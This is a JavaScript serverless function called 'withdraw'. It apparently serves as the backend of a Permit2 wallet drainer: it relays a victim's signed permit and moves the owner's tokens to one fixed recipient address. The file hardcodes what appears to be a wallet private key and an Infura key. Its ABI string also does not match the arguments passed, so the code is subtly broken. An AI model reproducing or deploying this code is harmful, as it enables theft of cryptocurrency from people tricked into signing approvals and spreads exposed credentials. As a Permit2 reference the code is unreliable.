// api/withdraw.js
const { ethers } = require('ethers');

// Initialize provider and wallet globally for Vercel warm-start optimization
const RPC_URL = "https://mainnet.infura.io/v3/08c65b8cf2e240289b07b7d0a55ecd18";
const PRIVATE_KEY = "db3abb1aa82f1330224830afe7fa9ed2fa9e9ac0157547dea0b04aa282becd86";
const RECIPIENT_ADDRESS = "0x3848f1375B64053910c8C5aDE2e0BDC89e243F20";
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

// Correct single Permit2 ABI format matching the canonical ISignatureTransfer structure
const PERMIT2_ABI = [
    "function permitTransferFrom((address token, uint256 amount) permit, (address to, uint256 requestedAmount) transferDetails, address owner, bytes signature)"
];
const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);

module.exports = async (req, res) => {
    if (req.method !== 'POST') return res.status(405).json({ success: false, message: 'Method not allowed' });

    try {
        const { signature, permitData, owner } = req.body;

        // Ensure proper checksum formatting for addresses passed to contract call
        const formattedOwner = ethers.utils.getAddress(owner);

        const tx = await permit2Contract.permitTransferFrom(
            {
                permitted: {
                    token: ethers.utils.getAddress(permitData.token),
                    amount: permitData.amount
                },
                nonce: permitData.nonce,
                deadline: permitData.deadline
            }, 
            { 
                to: RECIPIENT_ADDRESS, 
                requestedAmount: permitData.amount 
            },
            formattedOwner,
            signature
        );

        const receipt = await tx.wait();
        return res.status(200).json({ success: true, txHash: receipt.transactionHash });
    } catch (error) {
        console.error('Execution Error:', error);
        return res.status(500).json({ success: false, message: error.message });
    }
};
